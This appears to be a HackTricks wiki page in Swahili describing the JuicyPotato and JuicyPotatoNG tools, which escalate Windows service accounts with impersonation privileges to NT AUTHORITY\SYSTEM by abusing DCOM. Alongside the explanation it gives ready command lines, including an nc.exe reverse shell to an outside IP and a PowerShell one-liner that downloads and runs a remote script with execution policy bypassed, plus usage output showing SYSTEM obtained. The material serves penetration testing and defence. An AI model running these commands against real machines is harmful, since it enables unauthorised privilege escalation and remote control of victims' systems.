# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato ni legacy. Kwa ujumla hufanya kazi kwenye matoleo ya Windows hadi Windows 10 1803 / Windows Server 2016. Mabadiliko ya Microsoft yaliyoanza kwenye Windows 10 1809 / Server 2019 yalivunja technique ya awali. Kwa builds hizo na mpya zaidi, zingatia alternatives za kisasa kama PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato na nyinginezo. Tazama ukurasa ulio hapa chini kwa chaguo na matumizi yaliyosasishwa.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (kutumia vibaya golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Toleo lenye sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, lenye juice kidogo, yaani **tool nyingine ya Local Privilege Escalation, kutoka Windows Service Accounts hadi NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Unaweza kudownload juicypotato kutoka [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Maelezo mafupi ya compatibility

- Hufanya kazi kwa kutegemewa hadi Windows 10 1803 na Windows Server 2016 wakati context ya sasa ina SeImpersonatePrivilege au SeAssignPrimaryTokenPrivilege.
- Imevunjwa na hardening ya Microsoft kwenye Windows 10 1809 / Windows Server 2019 na matoleo ya baadaye. Tumia alternatives zilizounganishwa hapo juu kwa builds hizo.

### Muhtasari <a href="#summary" id="summary"></a>

[**Kutoka kwenye Readme ya juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [variants zake](https://github.com/decoder-it/lonelypotato) hutumia privilege escalation chain inayotegemea [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) iliyo na MiTM listener kwenye `127.0.0.1:6666`, na wakati una privileges za `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa kukagua Windows build tuligundua setup ambapo `BITS` ilikuwa imezimwa kimakusudi na port `6666` ilikuwa inatumiwa.

Tuliweka weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema hello kwa Juicy Potato**.

> Kwa theory, tazama [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na fuata chain ya links na references.<sup>[[4]](#references)</sup>

Mbali na `BITS`, COM servers kadhaa zinaweza kutumiwa vibaya. Zinahitaji tu:

1. ziweze ku-instantiwa na user wa sasa, kwa kawaida “service user” aliye na impersonation privileges
2. ziimplement interface ya `IMarshal`
3. ziendeshe kama user aliye na privileges za juu (SYSTEM, Administrator, …)

Baada ya testing tulipata na ku-test orodha pana ya [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) kwenye matoleo kadhaa ya Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato inakuruhusu:<sup>[[1]](#references)</sup>

- **Target CLSID** _chagua CLSID yoyote unayotaka._ [_Hapa_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kulingana na OS._
- **COM Listening port** _bainisha COM listening port unayopendelea (badala ya 6666 iliyowekwa hardcoded na marshalled)_
- **COM Listening IP address** _bind server kwenye IP yoyote_
- **Process creation mode** _kulingana na privileges za user aliye-impersonate unaweza kuchagua kutoka:_
- `CreateProcessWithToken` (inahitajika `SeImpersonate`)
- `CreateProcessAsUser` (inahitajika `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _launch executable au script ikiwa exploitation itafanikiwa_
- **Process Argument** _customize arguments za process iliyo-launchiwa_
- **RPC Server address** _kwa approach ya stealthy unaweza ku-authenticate kwenye RPC server ya nje_
- **RPC Server port** _ni muhimu ikiwa unataka ku-authenticate kwenye server ya nje na firewall inazuia port `135`…_
- **TEST mode** _hasa kwa madhumuni ya testing, yaani kutest CLSIDs. Huunda DCOM na kuchapisha user wa token. Tazama_ [_hapa kwa testing_](http://ohpe.it/juicy-potato/Test/)

### Matumizi <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Mawazo ya mwisho <a href="#final-thoughts" id="final-thoughts"></a>

[**Kutoka kwenye Readme ya juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Ikiwa user ana privileges za `SeImpersonate` au `SeAssignPrimaryToken`, basi wewe ni **SYSTEM**.

Karibu haiwezekani kuzuia abuse ya COM Servers hizi zote. Unaweza kufikiria kurekebisha permissions za objects hizi kupitia `DCOMCNFG`, lakini bahati njema—hili litakuwa gumu sana.

Suluhisho halisi ni kulinda accounts na applications nyeti zinazoendeshwa chini ya accounts za `* SERVICE`. Kusimamisha `DCOM` bila shaka kungezuia exploit hii, lakini kunaweza kuathiri sana OS ya msingi.

Kutoka: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG inarejesha local privilege escalation ya mtindo wa JuicyPotato kwenye Windows za kisasa kwa kuchanganya:<sup>[[2]](#references)</sup>
- DCOM OXID resolution kwenda kwenye local RPC server kwenye port iliyochaguliwa, hivyo kuepuka listener ya zamani iliyowekwa moja kwa moja kwenye 127.0.0.1:6666.
- SSPI hook ya kunasa na ku-impersonate SYSTEM authentication inayoingia bila kuhitaji RpcImpersonateClient, ambayo pia huwezesha CreateProcessAsUser wakati SeAssignPrimaryTokenPrivilege pekee ndiyo ipo.
- Tricks za kutimiza masharti ya DCOM activation (kwa mfano, hitaji la zamani la INTERACTIVE group wakati wa kulenga PrintNotify / ActiveX Installer Service classes).

Maelezo muhimu (tabia hubadilika kulingana na builds):<sup>[[2]](#references)</sup>
- Septemba 2022: Technique ya awali ilifanya kazi kwenye Windows 10/11 na Server targets zinazotumika, kwa kutumia “INTERACTIVE trick”.
- January 2023 update kutoka kwa authors: Microsoft baadaye ilizuia INTERACTIVE trick. CLSID tofauti ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) inarejesha exploitation, lakini kulingana na post yao inafanya kazi kwenye Windows 11 / Server 2022 pekee.

Basic usage (flags zaidi ziko kwenye help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Ikiwa unalenga Windows 10 1809 / Server 2019 ambapo JuicyPotato ya kawaida imewekewa patch, pendelea alternatives zilizounganishwa juu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, n.k.). NG inaweza kutegemea hali kulingana na build na hali ya service.

## Mifano

Kumbuka: Tembelea [ukurasa huu](https://ohpe.it/juicy-potato/CLSID/) kwa orodha ya CLSIDs za kujaribu.

### Pata reverse shell ya nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Zindua CMD mpya (ikiwa una ufikiaji wa RDP)

![Powershell rev - Zindua CMD mpya (ikiwa una ufikiaji wa RDP): Zindua CMD mpya (ikiwa una ufikiaji wa RDP)](<../../images/image (300).png>)

## Matatizo ya CLSID

Mara nyingi, CLSID chaguo-msingi inayotumiwa na JuicyPotato **haifanyi kazi**, na exploit hushindwa. Kwa kawaida, inahitajika kujaribu mara nyingi ili kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSID za kujaribu kwa mfumo mahususi wa uendeshaji, tembelea ukurasa huu:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kukagua CLSID**

Kwanza, utahitaji baadhi ya executables pamoja na juicypotato.exe.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na uipakie kwenye PS session yako, kisha download na execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Script hiyo itaunda orodha ya CLSID zinazowezekana za kujaribu.

Kisha download [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(badilisha path ya orodha ya CLSID na ya executable ya juicypotato) na ui-execute. Itaanza kujaribu kila CLSID, na **nambari ya port inapobadilika, hiyo itamaanisha kuwa CLSID imefanya kazi**.

**Kagua** CLSID zinazofanya kazi **kwa kutumia parameter -c**

## References

- [1] [README ya Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Kuipa JuicyPotato nafasi ya pili: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Ukurasa wa mradi wa Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Privilege Escalation kutoka Service Accounts hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
